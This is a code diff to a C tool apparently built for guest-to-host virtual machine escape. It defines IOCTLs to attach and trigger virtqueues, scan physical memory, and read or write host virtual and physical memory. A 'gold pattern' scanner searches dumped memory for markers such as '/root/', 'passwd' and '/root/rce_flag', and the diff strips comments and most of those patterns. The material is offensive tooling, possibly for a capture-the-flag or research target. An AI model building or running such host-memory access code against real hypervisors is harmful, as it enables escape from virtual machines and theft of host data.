@@ -34,7 +34,6 @@
 #define IOCTL_ATTACH_VQ          0x1013
 #define IOCTL_TRIGGER_VQ         0x1014
 #define IOCTL_SCAN_PHYS          0x1015
-// NEW: Host memory access IOCTLs
 #define IOCTL_READ_HOST_MEM      0x1016
 #define IOCTL_WRITE_HOST_MEM     0x1017
 #define IOCTL_READ_HOST_PHYS     0x1018
@@ -100,30 +99,23 @@ struct attach_vq_data {
     unsigned int queue_index;
 };
 
-// NEW: Host memory access structures
 struct host_mem_access {
-    unsigned long host_addr;     // Host virtual address
+    unsigned long host_addr;
     unsigned long length;
     unsigned char *user_buffer;
 };
 
-// NEW: Host physical memory access
 struct host_phys_access {
-    unsigned long host_phys_addr; // Host physical address
+    unsigned long host_phys_addr;
     unsigned long length;
     unsigned char *user_buffer;
 };
 
-// Gold pattern constants
-#define GOLD_FLAG_STRINGS_COUNT 4
+#define GOLD_FLAG_STRINGS_COUNT 0
 static const char *GOLD_ASCII_STRINGS[GOLD_FLAG_STRINGS_COUNT] = {
-    "/home/",
-    "/root/",
-    "passwd",
-    "/root/rce_flag"
 };
 
-#define GOLD_HEX_STRINGS_COUNT 4
+#define GOLD_HEX_STRINGS_COUNT 1
 static const char *GOLD_HEX_STRINGS[GOLD_HEX_STRINGS_COUNT] = {
     "44434241efbeadde"
 };
@@ -715,13 +707,11 @@ int main(int argc, char *argv[]) {
                 }
             } else {
                 if (gold_scan) {
-                    // Only show output if gold patterns found
                     int gold_found = check_gold_patterns(buf, step, addr);
                     if (gold_found) {
                         gold_found_any = 1;
                     }
                 } else {
-                    // Regular output with both hex and ASCII
                     printf("0x%lX:\nHex: ", addr);
                     for (unsigned long i = 0; i < step; ++i) {
                         printf("%02X", buf[i]);
@@ -783,13 +773,11 @@ int main(int argc, char *argv[]) {
                 }
             } else {
                 if (gold_scan) {
-                    // Only show output if gold patterns found
                     int gold_found = check_gold_patterns(buf, step, addr);
                     if (gold_found) {
                         gold_found_any = 1;
                     }
                 } else {
-                    // Regular output with both hex and ASCII
                     printf("0x%lX:\nHex: ", addr);
                     for (unsigned long i = 0; i < step; ++i) {
                         printf("%02X", buf[i]);
